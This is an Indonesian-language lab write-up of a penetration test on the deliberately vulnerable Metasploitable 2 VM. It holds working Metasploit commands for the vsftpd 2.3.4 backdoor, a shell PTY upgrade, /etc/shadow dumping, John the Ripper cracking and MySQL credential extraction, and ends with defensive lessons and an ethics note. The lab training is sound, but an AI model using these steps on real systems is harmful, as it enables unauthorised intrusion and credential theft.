# Laporan Praktik: Simulasi Hacking pada Metasploitable 2

**Tujuan:** Latihan keamanan siber (penetration testing) di lingkungan lab terisolasi, untuk memahami siklus serangan dasar: scanning → eksploitasi → post-exploitation → password cracking → pengumpulan kredensial.

**Lingkungan lab:**
- Target: Metasploitable 2 (`192.168.56.101`) — VM sengaja dibuat rentan untuk latihan
- Attacker: Arch Linux (`192.168.56.1`) di VirtualBox
- Jaringan: Host-only, terisolasi dari internet dan LAN nyata
- Tools: Nmap, Wireshark, Metasploit Framework, John the Ripper, MySQL client

> ⚠️ Semua teknik di laporan ini hanya sah dipakai pada sistem milik sendiri atau dengan izin eksplisit. Metasploitable sengaja dibuat rentan untuk tujuan edukasi.

---

## Ringkasan Alur Serangan

```
1. Reconnaissance (Nmap + Wireshark)
        ↓
2. Identifikasi celah: vsftpd 2.3.4 (backdoor terkenal)
        ↓
3. Eksploitasi → akses shell root
        ↓
4. Post-exploitation: dump /etc/shadow
        ↓
5. Password cracking (John the Ripper)
        ↓
6. Pengumpulan kredensial lanjutan (database MySQL / DVWA)
```

Satu celah di satu layanan (FTP) berujung pada kompromi penuh sistem operasi dan aplikasi web di atasnya — pola umum dalam insiden nyata.

---

## Tahap 1 — Persiapan Lab

```bash
VBoxManage startvm Metasploitable2
ping 192.168.56.101
```

Login console VM (hanya untuk verifikasi / troubleshooting, bukan bagian dari "serangan"):
- Username: `msfadmin`
- Password: `msfadmin`

---

## Tahap 2 — Reconnaissance (Nmap + Wireshark)

Wireshark dijalankan bersamaan untuk mengamati traffic mentah saat scanning, bukan hanya mempercayai output teks Nmap.

```bash
sudo wireshark &
```
Filter capture: `ip.addr == 192.168.56.101`

```bash
nmap -sV 192.168.56.101
```

**Port terbuka yang ditemukan:**

| Port | Layanan | Catatan |
|---|---|---|
| 21 | FTP (vsftpd 2.3.4) | Versi dengan backdoor terkenal |
| 22 | SSH | Rentan brute force password lemah |
| 23 | Telnet | Rentan brute force password lemah |
| 80 | HTTP | Berisi DVWA, Mutillidae, dll |

**Analisis paket di Wireshark (host discovery + scan -sT):**

- Nmap mengirim SYN probe ke tiap port.
- Port terbuka membalas **SYN-ACK**, lalu Nmap menyelesaikan three-way handshake (ACK) sebelum langsung memutus dengan **RST, ACK** — ciri khas *TCP connect scan* (`-sT`), karena tidak ada data aplikasi yang dikirim.
- Port tertutup membalas langsung dengan **RST, ACK** sebagai respons terhadap SYN.
- TTL di semua paket balasan = 64, menandakan target satu hop jauhnya dan menjalankan Linux.
- Window size dan opsi TCP (Timestamp, WScale) pada SYN-ACK mencerminkan stack kernel Linux 2.6 lama — konsisten dengan usia Metasploitable 2.

---

## Tahap 3 — Eksploitasi: vsftpd 2.3.4 Backdoor

### Latar belakang kerentanan

Pada 2011, source code vsftpd resmi disusupi pihak tak dikenal di server distribusinya. Backdoor yang disisipkan: jika username yang dikirim ke FTP mengandung string `:)`, server membuka shell **root** di port **6200**, terlepas dari sukses/gagalnya login FTP itu sendiri. Ini contoh klasik **supply chain attack**.

### Eksekusi

```bash
msfconsole
```

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set PAYLOAD cmd/unix/interact
run
```

> Catatan teknis: payload default (`cmd/linux/http/.../meterpreter_reverse_tcp`) butuh membuka server HTTP sementara di host untuk mengirim payload — ini rawan konflik port (`Rex::BindFailed`) dan koneksi tidak stabil (timeout, sesi mati). Payload `cmd/unix/interact` lebih stabil karena langsung memakai koneksi backdoor port 6200 itu sendiri tanpa komponen tambahan.

### Verifikasi akses

```
shell
whoami      # root
id
uname -a
```

### Upgrade ke TTY interaktif penuh

Shell dasar dari backdoor tidak mendukung perintah seperti `su`, `passwd`, atau editor teks. Upgrade dengan:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Tahap 4 — Post-Exploitation: Pengumpulan Hash Password

```bash
cat /etc/passwd    # daftar user & shell
cat /etc/shadow    # hash password semua user
```

Hash disalin ke file di mesin attacker untuk di-crack offline:

```bash
nano shadow.txt    # paste isi /etc/shadow
```

---

## Tahap 5 — Password Cracking (John the Ripper)

```bash
john shadow.txt
john --show shadow.txt
```

John otomatis mendeteksi format **MD5-crypt** (`$1$`), algoritma hash lama yang jauh lebih cepat di-brute-force dibanding standar modern (bcrypt/Argon2/scrypt).

**Hasil crack:**

| User | Password | Metode ditemukan |
|---|---|---|
| msfadmin | msfadmin | Single mode (sama dengan username) |
| user | user | Single mode |
| service | service | Single mode |
| postgres | postgres | Single mode |
| klog | 123456789 | Wordlist |
| sys | batman | Wordlist |
| root | *(tidak ditemukan)* | Incremental (brute force) — dihentikan karena tidak efektif |

**Catatan teknis penting:**
- John "meng-hash" tebakan password lalu membandingkan dengan hash asli — bukan "mendekripsi", karena hash adalah fungsi satu arah yang tidak bisa dibalik.
- Password root di Metasploitable 2 memang tidak pernah diset ke nilai yang bisa ditebak via wordlist, sehingga brute force terhadapnya tidak produktif. Ini tidak masalah karena akses root sudah didapat lewat exploit backdoor di Tahap 3.
- File hash sebaiknya dicek duplikasi (`sort -u shadow.txt -o shadow.txt`) sebelum crack, karena baris ganda membuat hasil `--show` tampil dobel.

**Verifikasi kredensial** (butuh TTY penuh, lihat Tahap 3):
```bash
su user
# password: user
```

---

## Tahap 6 — Kredensial Database & Aplikasi Web

Konfigurasi DVWA mengungkap kredensial database:

```bash
cat /var/www/dvwa/config/config.inc.php
```

```
db_user = root
db_password = '' (kosong)
```

Login ke MySQL dan eksplorasi:

```bash
mysql -u root
```

```sql
SHOW DATABASES;
```

**Database yang ditemukan:** `information_schema`, `dvwa`, `metasploit`, `mysql`, `owasp10`, `tikiwiki`, `tikiwiki195`

```sql
USE dvwa;
SHOW TABLES;
SELECT * FROM users;
```

Query ini mengungkap username dan hash password **level aplikasi** (DVWA), terpisah dari hash sistem operasi di `/etc/shadow`. Bisa juga dicek kredensial MySQL itu sendiri:

```sql
SELECT user, password FROM mysql.user;
```

---

## Temuan & Pelajaran Keamanan

1. **Supply chain attack** — backdoor vsftpd menunjukkan bahwa ancaman bisa datang dari source resmi yang disusupi, bukan cuma bug pemrograman biasa. Verifikasi checksum/signature software tetap penting.
2. **Password lemah & reuse** — 6 dari 7 akun sistem punya password yang identik dengan username atau kata umum, dan di-crack dalam hitungan detik.
3. **Algoritma hash usang** — MD5-crypt jauh lebih lemah dibanding standar modern; sistem produksi harus pakai bcrypt/Argon2/scrypt yang sengaja dibuat lambat.
4. **Kredensial database plaintext di file konfigurasi** — `config.inc.php` menyimpan password database secara terbuka, pola umum yang jadi target penyerang setelah mendapat akses file sistem.
5. **Efek domino satu celah** — satu service yang rentan (FTP) berujung mengungkap seluruh sistem operasi dan database aplikasi di atasnya.

---

## Lampiran: Troubleshooting yang Dihadapi

| Masalah | Penyebab | Solusi |
|---|---|---|
| `Rex::BindFailed ... :8080` | Port fetch server bentrok | `set FETCH_SRVPORT 8888` atau ganti payload ke `cmd/unix/interact` |
| "Backdoor bind listener already open" | Port 6200 masih aktif dari percobaan sebelumnya | `set ForceExploit true`, atau restart `vsftpd` dari console VM |
| Sesi Meterpreter "Send timed out" → "Died" | Koneksi reverse HTTP tidak stabil | Gunakan payload `cmd/unix/interact` yang lebih sederhana |
| `su: must be run from a terminal` | Shell belum PTY penuh | `python -c 'import pty; pty.spawn("/bin/bash")'` |
| `mysql` / `USE dvwa;` "unknown command" di meterpreter | Perintah OS/SQL dijalankan di prompt yang salah | `mysql` lewat `shell` dulu; `USE` hanya valid di dalam prompt `mysql>` |
| John: "Crash recovery file is locked" | Sesi crack sebelumnya belum ditutup bersih | `rm ~/.john/john.rec`, lanjutkan `john shadow.txt` |
| Hasil `john --show` tampil dobel | File `shadow.txt` berisi baris duplikat | `sort -u shadow.txt -o shadow.txt` |

---

## Catatan Etika

Seluruh praktik ini dilakukan pada VM lab pribadi yang terisolasi (host-only network), bukan sistem produksi atau milik pihak lain. Teknik yang sama (backdoor exploitation, credential dumping, password cracking) tanpa izin eksplisit terhadap sistem pihak lain adalah tindak pidana di hampir semua yurisdiksi.
